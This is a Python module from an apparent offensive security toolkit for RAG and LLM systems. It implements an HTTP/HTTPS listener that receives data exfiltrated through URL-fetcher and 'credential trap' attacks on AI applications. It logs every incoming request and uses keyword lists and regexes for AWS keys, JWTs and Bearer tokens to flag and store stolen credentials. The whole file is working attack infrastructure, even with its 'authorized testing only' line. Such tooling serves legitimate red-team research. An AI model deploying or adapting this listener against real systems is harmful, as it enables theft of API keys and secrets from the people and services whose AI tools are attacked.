"""R3 Support: HTTP Listener for Credential Capture.

Used with RD-0304 (URL Fetcher Exploitation) and RD-0403 (Credential Trap).
Logs all incoming requests and highlights captured credentials.

ATLAS Tactic: Exfiltration

For authorized security testing and research only.
"""

from __future__ import annotations

import json
import re
import ssl
import subprocess
import tempfile
from dataclasses import dataclass, field
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


# --- ANSI colors ---

class _Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


# --- Credential detection ---

# Keyword patterns to scan for in query params, headers, and body
CREDENTIAL_KEYWORDS = [
    "api_key",
    "apikey",
    "api-key",
    "token",
    "password",
    "passwd",
    "secret",
    "authorization",
    "bearer",
    "key=",
    "access_key",
    "secret_key",
    "client_secret",
    "client_id",
]

# Regex patterns for structured credential formats
CREDENTIAL_PATTERNS = [
    # AWS access key IDs
    re.compile(r"(AKIA[0-9A-Z]{16})"),
    # JWT tokens
    re.compile(r"(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})"),
    # Bearer token in header value
    re.compile(r"Bearer\s+(\S+)", re.IGNORECASE),
    # Generic API key patterns (hex, base64-ish)
    re.compile(r"(?:api[_-]?key|token|secret|password)\s*[=:]\s*(\S+)", re.IGNORECASE),
]


@dataclass
class Credential:
    """A detected credential in a request."""

    source: str  # "query", "header", "body"
    key: str
    value: str


@dataclass
class CapturedRequest:
    """A single captured HTTP request."""

    timestamp: str
    source_ip: str
    method: str
    path: str
    query_string: str
    headers: dict[str, str]
    body: str
    credentials: list[Credential] = field(default_factory=list)

    def to_dict(self) -> dict:
        result: dict = {
            "timestamp": self.timestamp,
            "source_ip": self.source_ip,
            "method": self.method,
            "path": self.path,
            "query_string": self.query_string,
            "headers": self.headers,
            "body": self.body,
        }
        if self.credentials:
            result["credentials"] = [
                {"source": c.source, "key": c.key, "value": c.value}
                for c in self.credentials
            ]
        return result


def detect_credentials(
    query_params: dict[str, list[str]],
    headers: dict[str, str],
    body: str,
) -> list[Credential]:
    """Scan request components for credential-like values.

    Checks query parameters, headers, and body against keyword patterns
    and structured credential formats (AWS keys, JWTs, Bearer tokens).

    Args:
        query_params: Parsed query string parameters.
        headers: Request headers as key-value pairs.
        body: Raw request body text.

    Returns:
        List of detected Credential objects.
    """
    creds: list[Credential] = []

    # Check query parameters
    for param_name, values in query_params.items():
        name_lower = param_name.lower()
        for keyword in CREDENTIAL_KEYWORDS:
            if keyword in name_lower or name_lower in keyword:
                for val in values:
                    creds.append(Credential(source="query", key=param_name, value=val))
                break

    # Check headers
    for header_name, header_value in headers.items():
        name_lower = header_name.lower()
        if name_lower in ("authorization", "x-api-key", "x-auth-token"):
            creds.append(Credential(source="header", key=header_name, value=header_value))
            continue
        for keyword in CREDENTIAL_KEYWORDS:
            if keyword in name_lower:
                creds.append(Credential(source="header", key=header_name, value=header_value))
                break

    # Check body with keyword scan
    body_lower = body.lower()
    for keyword in CREDENTIAL_KEYWORDS:
        if keyword.rstrip("=") in body_lower:
            # Try to extract key=value pairs from body
            pattern = re.compile(
                rf'["\']?({re.escape(keyword.rstrip("="))}[^"\']*?)["\']?\s*[=:]\s*["\']?([^"\'&\s,}}]+)',
                re.IGNORECASE,
            )
            for match in pattern.finditer(body):
                creds.append(Credential(source="body", key=match.group(1), value=match.group(2)))

    # Check all components with structured patterns
    combined = " ".join(
        list(query_params.keys())
        + [v for vals in query_params.values() for v in vals]
        + list(headers.values())
        + [body]
    )
    for pattern in CREDENTIAL_PATTERNS:
        for match in pattern.finditer(combined):
            value = match.group(1) if match.lastindex else match.group(0)
            # Avoid duplicates
            if not any(c.value == value for c in creds):
                creds.append(Credential(source="pattern", key=pattern.pattern[:30], value=value))

    return creds


def write_capture(capture: CapturedRequest, output_path: str | Path) -> None:
    """Append a captured request to the JSON log file.

    Each capture is written as a single JSON line (JSONL format).

    Args:
        capture: The captured request to log.
        output_path: Path to the output file.
    """
    with open(output_path, "a") as f:
        f.write(json.dumps(capture.to_dict()) + "\n")


def format_request_output(capture: CapturedRequest) -> str:
    """Format a captured request for terminal display.

    Normal requests are displayed in dim text. Credential captures
    are highlighted in red with a [!] CAPTURE prefix.

    Args:
        capture: The captured request to format.

    Returns:
        Formatted string for terminal output.
    """
    c = _Colors
    separator = "\u2500" * 45

    lines = [separator]

    has_creds = len(capture.credentials) > 0
    timestamp = capture.timestamp.split("T")[1].split(".")[0] if "T" in capture.timestamp else capture.timestamp

    if has_creds:
        lines.append(
            f"{c.RED}{c.BOLD}[!] CAPTURE{c.RESET} "
            f"[{timestamp}] {capture.method} {capture.path}"
            f"{'?' + capture.query_string if capture.query_string else ''} HTTP/1.1"
        )
    else:
        lines.append(
            f"{c.DIM}[{timestamp}] {capture.method} {capture.path}"
            f"{'?' + capture.query_string if capture.query_string else ''} HTTP/1.1{c.RESET}"
        )

    lines.append(f"  From:  {capture.source_ip}")

    user_agent = capture.headers.get("User-Agent", capture.headers.get("user-agent", ""))
    if user_agent:
        lines.append(f"  Agent: {user_agent}")

    if has_creds:
        for cred in capture.credentials:
            lines.append(
                f"  {c.RED}{c.BOLD}>> CREDENTIAL: {cred.key} = {cred.value}{c.RESET}"
            )

    lines.append(separator)
    return "\n".join(lines)


# --- HTTP Server ---

class _CaptureHandler(BaseHTTPRequestHandler):
    """HTTP request handler that logs all requests and detects credentials."""

    output_path: str = "captures.json"

    def _handle_request(self) -> None:
        parsed = urlparse(self.path)
        query_params = parse_qs(parsed.query)

        # Read body
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace") if content_length > 0 else ""

        # Collect headers
        headers = {k: v for k, v in self.headers.items()}

        # Detect credentials
        creds = detect_credentials(query_params, headers, body)

        capture = CapturedRequest(
            timestamp=datetime.now(timezone.utc).isoformat(),
            source_ip=self.client_address[0],
            method=self.command,
            path=parsed.path,
            query_string=parsed.query,
            headers=headers,
            body=body,
            credentials=creds,
        )

        # Display
        print(format_request_output(capture))

        # Log to file
        write_capture(capture, self.output_path)

        # Respond with 200
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def do_GET(self) -> None:
        self._handle_request()

    def do_POST(self) -> None:
        self._handle_request()

    def do_PUT(self) -> None:
        self._handle_request()

    def do_DELETE(self) -> None:
        self._handle_request()

    def do_PATCH(self) -> None:
        self._handle_request()

    def do_HEAD(self) -> None:
        self._handle_request()

    def do_OPTIONS(self) -> None:
        self._handle_request()

    def log_message(self, format: str, *args: object) -> None:
        # Suppress default http.server logging; we handle our own output
        pass


class OpenSSLUnavailable(RuntimeError):
    """Raised when openssl is missing or fails during self-signed cert generation."""


def generate_self_signed_cert(cert_dir: str | None = None) -> tuple[str, str]:
    """Generate a self-signed TLS certificate and key.

    Uses openssl to create a temporary cert/key pair for HTTPS serving.

    Args:
        cert_dir: Directory to store cert files. Uses tempdir if None.

    Returns:
        Tuple of (cert_path, key_path).

    Raises:
        OpenSSLUnavailable: If openssl is not on PATH or cert generation fails.
    """
    if cert_dir is None:
        cert_dir = tempfile.mkdtemp(prefix="ragdrag-tls-")
    cert_path = str(Path(cert_dir) / "cert.pem")
    key_path = str(Path(cert_dir) / "key.pem")

    try:
        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", key_path, "-out", cert_path,
                "-days", "1", "-nodes",
                "-subj", "/CN=ragdrag-listener",
            ],
            capture_output=True,
            check=True,
        )
    except FileNotFoundError as e:
        raise OpenSSLUnavailable(
            "openssl not found on PATH. Install it (macOS: 'brew install openssl'; "
            "Debian/Ubuntu: 'apt install openssl') or run the listener without --tls."
        ) from e
    except subprocess.CalledProcessError as e:
        stderr = e.stderr.decode("utf-8", errors="replace") if e.stderr else ""
        raise OpenSSLUnavailable(
            f"openssl failed to generate self-signed cert (exit {e.returncode}). "
            f"stderr: {stderr.strip() or '<empty>'}"
        ) from e

    return cert_path, key_path


def start_listener(
    host: str = "0.0.0.0",
    port: int = 8443,
    output: str = "captures.json",
    tls: bool = False,
) -> None:
    """Start the credential capture HTTP listener.

    Binds to the specified host/port and logs all incoming requests.
    Credential-bearing requests are highlighted in the terminal output.

    Args:
        host: Host to bind to.
        port: Port to listen on.
        output: Path to the capture log file.
        tls: If True, generate a self-signed cert and serve HTTPS.
    """
    _CaptureHandler.output_path = output

    server = HTTPServer((host, port), _CaptureHandler)

    scheme = "http"
    if tls:
        cert_path, key_path = generate_self_signed_cert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        scheme = "https"
        print(f"[*] TLS enabled (self-signed cert: {cert_path})")

    print(f"[*] RAGdrag listener active on {scheme}://{host}:{port}")
    print(f"[*] Captures will be saved to {output}")
    print("[*] Press Ctrl+C to stop")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Listener stopped.")
    finally:
        server.server_close()
